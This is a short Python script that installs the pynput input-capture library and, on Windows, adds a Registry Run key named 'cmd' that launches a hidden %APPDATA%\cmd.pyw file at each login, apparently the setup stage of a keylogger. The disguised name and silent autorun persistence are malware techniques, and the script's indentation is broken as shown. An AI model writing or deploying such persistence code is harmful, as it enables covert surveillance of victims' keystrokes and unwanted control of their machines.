import subprocess,os,sys
try:
    subprocess.call("python -m pip install pynput",shell=True)
        if sys.platform == "win32":
            loc = os.environ["appdata"] + "\\cmd.pyw"
            subprocess.call(f'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V "cmd" /t REG_SZ /F /D "{loc}"')        
    with open("success.txt","w") as f:
        f.write("Succesfull")
except Exception as e:
    with open("failed.txt","w") as f:
        f.write(str(e))
